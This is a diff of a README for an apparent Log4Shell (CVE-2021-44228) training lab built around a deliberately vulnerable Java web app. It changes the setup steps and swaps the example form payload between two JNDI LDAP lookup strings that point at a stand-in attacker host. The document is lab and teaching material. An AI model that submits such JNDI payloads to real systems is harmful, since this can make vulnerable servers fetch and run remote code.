@@ -20,13 +20,13 @@ This is a minimal Java web application vulnerable to **Log4Shell (CVE-2021-44228
 ### Clone the repository:
 ```bash
 git clone https://github.com/SanderSchepers1993/CyberSec25.git
-cd CyberSec25
+cd CyberSec25/scripts
 ```
 
 ### Run the setup script:
 ```bash
-chmod +x setup.sh
-./setup.sh
+chmod +x run_exploit.sh
+./run_exploit.sh
 ```
 
 Open your browser and visit:
@@ -38,7 +38,7 @@ Open your browser and visit:
 
 Submit the following payload to the form:
 ```text
-${jndi:ldap://attacker.com/a}
+${jndi:ldap://Attacker-IP:ldap-port/a}
 ```
 This will be **logged by Log4j**, potentially triggering the Log4Shell exploit **if you have a rogue LDAP server running**.
 
@@ -60,7 +60,6 @@ CyberSec25/
     └── setup.sh
 ├── README.md
 └── test_payload.txt # Payload voor formulierinvoer
-
 ```
 
 ---
